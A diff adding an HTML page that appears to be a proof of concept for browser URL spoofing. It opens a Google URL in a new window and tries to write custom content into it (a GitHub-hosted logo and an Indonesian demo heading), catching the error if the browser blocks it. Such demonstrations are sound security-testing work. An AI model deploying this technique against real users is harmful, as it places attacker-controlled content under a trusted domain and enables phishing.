@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
+
+  <script>
+    function spoof() {
+      let win = window.open("https://www.google.com/gen_204", "_blank");
+
+      let payload = `
+      <div style="text-align:center; padding-top:20px">
+        <img src="https://umar1105.github.io/602651.jpg"
+         alt="Custom Logo" width="160" height="56">
+        <h2>Demo pakai gambar dari GitHub</h2>
+      </div>
+      `;
+
+      setTimeout(() => {
+        try {
+          win.document.write(payload);
+          win.document.close();
+        } catch (e) {
+          console.warn("Blocked by browser protections:", e);
+        }
+      }, 200);
+    }
+  </script>
+</body>
+</html>
